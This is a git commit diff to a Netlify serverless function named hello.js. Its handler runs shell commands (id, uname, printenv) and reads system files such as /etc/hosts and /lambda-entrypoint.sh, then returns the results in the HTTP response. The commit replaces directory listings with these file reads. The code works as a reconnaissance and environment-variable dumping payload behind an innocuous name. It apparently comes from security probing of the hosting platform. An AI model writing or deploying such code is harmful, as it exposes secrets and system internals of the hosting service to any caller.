99016302277abf5af387b09fecc6748614d3943f
Vitor-Aguiar <vitor.aguiar.infosec@gmail.com>
2025-07-25 08:07:33 -0300

    Update hello.js

--- netlify/functions/hello.js
+++ netlify/functions/hello.js
@@ -6,10 +6,10 @@ exports.handler = async function (event, context) {
       id: execSync("id").toString().trim(),
       uname: execSync("uname -a").toString().trim(),
       env: execSync("printenv").toString().trim(),
-      command: execSync("ls -la /").toString().trim(),
-      command2: execSync("ls -laR /opt/").toString().trim(),
-      command3: execSync("ls -la /etc/").toString().trim(),
-      command4: execSync("ls -laR /tmp/").toString().trim(),
+      command: execSync("cat /etc/host.conf").toString().trim(),
+      command2: execSync("cat /etc/hosts").toString().trim(),
+      command3: execSync("cat /etc/image-id").toString().trim(),
+      command4: execSync("cat /lambda-entrypoint.sh").toString().trim(),
     };
 
     return {
